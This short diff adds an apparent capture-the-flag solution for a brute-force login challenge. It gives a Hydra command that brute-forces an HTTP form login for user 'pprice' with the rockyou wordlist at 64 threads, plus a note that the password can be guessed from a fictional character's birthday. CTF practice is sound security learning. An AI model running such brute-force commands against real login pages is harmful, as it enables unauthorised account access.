@@ -1,0 +1,6 @@
+Solution1 (takes 7 min):
+hydra <HOST> http-form-post "/ctf/bruteForceChallenge1.php:username=^USER^&password=^PASS^:Wrong password" -l pprice -P /usr/share/wordlists/rockyou.txt -t 64
+
+Solution2:
+the password can be guessed by researching his birthday
+http://mrrobot.wikia.com/wiki/Phillip_Price
